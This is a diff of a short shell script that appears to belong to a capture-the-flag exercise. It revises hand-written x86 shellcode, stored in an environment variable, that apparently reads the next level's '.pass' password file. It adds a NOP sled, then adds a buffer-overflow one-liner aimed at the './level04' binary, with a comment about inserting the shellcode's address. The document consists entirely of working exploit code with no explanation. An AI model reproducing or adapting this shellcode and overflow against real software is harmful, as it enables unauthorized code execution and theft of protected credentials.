@@ -1,7 +1,7 @@
 export SHELLCODE=$(
-	python -c 'print("\x6a\x01" * 10 + "\x6a\x73" +
-	"\x68\x70\x61\x73\x73" +
-	"\x68\x30\x34\x2f\x2e" +
+	python -c 'print("\x90" * 20 + "\x6a\x01" * 10 + "\x6a\x73" +
+	"\x68\x2e\x70\x61\x73" +
+	"\x68\x30\x35\x2f\x2f" +
 	"\x68\x65\x76\x65\x6c" +
 	"\x68\x72\x73\x2f\x6c" +
 	"\x68\x2f\x75\x73\x65" +
@@ -29,3 +29,6 @@ export SHELLCODE=$(
 	"\xb0\x01" +
 	"\xcd\x80"
 	)')
+
+#											replace with your getenv("SHELLCODE")
+./level04 < <(python -c 'print("a" * 128 + "\x00\x00\x00\x00" * 30)')
